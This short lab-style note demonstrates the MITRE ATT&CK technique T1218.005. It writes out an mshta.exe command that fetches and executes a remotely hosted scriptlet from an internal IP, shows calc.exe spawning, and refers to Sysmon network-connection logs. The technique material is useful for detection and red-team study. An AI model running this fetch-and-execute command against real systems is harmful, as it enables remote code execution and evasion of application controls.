Invoking the scriptlet file hosted remotely
```
/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/file.sct")).Exec();close();
```

calc.exe is spawned by mshta.exe:

![image](https://github.com/user-attachments/assets/0165509e-73ad-4a73-a70f-f9be47a1eb37)

sysmon logs for mshta establishing network connections:

![image](https://github.com/user-attachments/assets/01232198-2016-4da8-a19c-902be70a96ee)

# References
- https://attack.mitre.org/techniques/T1218/005/
